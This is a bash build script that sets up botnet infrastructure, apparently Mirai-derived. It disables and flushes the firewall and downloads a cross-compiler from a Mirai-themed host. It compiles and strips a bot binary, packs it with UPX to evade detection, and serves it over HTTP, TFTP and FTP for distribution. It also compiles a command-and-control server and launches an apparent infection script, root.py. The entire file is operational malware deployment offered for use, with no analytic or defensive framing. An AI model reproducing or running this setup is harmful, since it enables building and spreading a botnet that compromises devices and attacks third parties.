#!/bin/bash


yum install nano screen gcc perl wget bzip2 php python3 -y

service httpd restart
service iptables stop
iptables -F

mkdir /etc/xcompile
cd /etc/xcompile 
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i586.tar.bz2 --no-check-certificate

tar -jxf cross-compiler-i586.tar.bz2
rm -rf cross-compiler-i586.tar.bz2
mv cross-compiler-i586 i586
cd ~/

#add compiler to path (yes we only need the one)
export PATH=$PATH:/etc/xcompile/i586/bin

function compile_bot {
    "$1-gcc" $3 main/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DDREAD_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

mkdir release
compile_bot i586 rbot "-static"

mkdir /var/www/html/botpilled
mv ~/release/* /var/www/html/botpilled

rm -rf release

yum install httpd -y; service httpd start; yum install xinetd tftp-server -y; yum install vsftpd -y; service vsftpd start

service httpd restart
service xinetd restart

ulimit -n 999999

gcc cnc.c -o cnc -pthread

mv ~/tools/iptool.php /var/www/html

mv ~/tools/upx ~/
chmod +x upx
./upx --ultra-brute /var/www/html/botpilled/*
rm -rf upx
mv ~/tools/root.py ~/
rm -rf tools
#build is now complete

iptables -F

clear
#no need for .sh bins to overcomplicate this
python3 root.py